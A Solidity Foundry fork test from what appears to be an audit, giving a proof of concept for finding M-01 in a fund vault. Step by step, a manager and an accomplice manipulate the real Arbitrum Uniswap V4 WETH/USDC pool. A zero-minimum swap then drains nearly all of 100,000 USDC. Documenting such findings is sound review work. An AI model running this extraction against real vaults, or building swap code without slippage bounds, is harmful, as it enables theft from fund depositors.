// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {IStateView} from "@uniswap/v4-periphery/src/interfaces/IStateView.sol";

import {SpokeAForkBase, PoolTrader} from "./SpokeAForkBase.sol";

/// @notice [M-01] (spoke-a) What the Mandate does not bound: a manager verb takes any `minAmountOut`, and nothing in
///         the Spoke Vault compares an execution price with an oracle. A manager and an accomplice (or a compromised
///         manager key, DEC-003) move the fund's Unallocated Balance to the accomplice through one swap in a Mandate
///         pool: the real Arbitrum V4 WETH/USDC 0.05% pool, real PoolManager, real hub SpokeVault and adapter.
/// @dev Run: ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc ARBITRUM_FORK_BLOCK=<head - 100>
///      forge test --match-path 'test/review/spoke-a/M01_ManagerSwapExtractionFork.t.sol' -vv
contract M01_ManagerSwapExtractionFork is SpokeAForkBase {
    /// @dev Ported to main unchanged, STILL_PRESENT (register S-8, Open, founder decision; consolidated report
    ///      section 9 "Execution price"). e5c778a: 0.369 WETH (989.72 USDC) for 100,000 USDC, accomplice +98,911.
    function test_POC_REVIEW_SEC9_fork_managerSwapAtASelfSetPriceWithMinimumZero() public {
        _depositAs(alice, 200_000e6);
        vm.prank(manager);
        vault.allocateToHubSpokeVault(100_000e6);
        uint256 price1e18 = adapter.spotQuote(poolId, WETH, 1e18);
        uint256 assetsBefore = vault.shareAssets();

        // The accomplice: 1,000 WETH and 1,000,000 USDC of flash capital.
        PoolTrader accomplice = new PoolTrader(IPoolManager(PM), key);
        deal(WETH, address(accomplice), 1000e18);
        deal(USDC, address(accomplice), 1_000_000e6);
        uint256 wethStart = 1000e18;
        uint256 usdcStart = 1_000_000e6;

        // 1. Push the WETH price up 100x (46,050 ticks) and leave a WETH-only range just above it.
        int24 up = _floor10(tick0 + 46_050);
        accomplice.swapTo(false, up);
        accomplice.modify(up + 10, up + 1010, 2e16);
        // 2. The manager swaps 100,000 USDC of Unallocated Balance with minAmountOut = 0: the vault accepts any output.
        vm.prank(manager);
        uint256 wethOut = hubVault.swapExactInput(address(adapter), poolId, USDC, 100_000e6, 0, "");
        // 3. The accomplice takes its range back and swaps the pool back to where it was.
        accomplice.modify(up + 10, up + 1010, -2e16);
        accomplice.swapTo(true, tick0);

        (, int24 tickAfter,,) = IStateView(SV).getSlot0(PoolId.wrap(poolId));
        uint256 assetsAfter = vault.shareAssets();
        int256 profit = (int256(IERC20(WETH).balanceOf(address(accomplice))) - int256(wethStart)) * int256(price1e18)
            / 1e18 + int256(IERC20(USDC).balanceOf(address(accomplice))) - int256(usdcStart);
        console2.log("WETH the fund got for 100,000 USDC", wethOut);
        console2.log("worth at the oracle (USDC)", wethOut * price1e18 / 1e18);
        console2.log("share assets before", assetsBefore);
        console2.log("share assets after", assetsAfter);
        console2.log("accomplice profit (USDC)", profit);
        console2.log("tick before", tick0);
        console2.log("tick after", tickAfter);

        assertApproxEqAbs(int256(tickAfter), int256(tick0), 1);
        assertLt(wethOut * price1e18 / 1e18, 2000e6, "100,000 USDC bought less than 2,000 USDC of WETH");
        assertGt(assetsBefore - assetsAfter, 97_000e6, "the fund lost over 97% of the swapped amount");
        assertGt(profit, 97_000e6, "the accomplice kept it");
    }
}
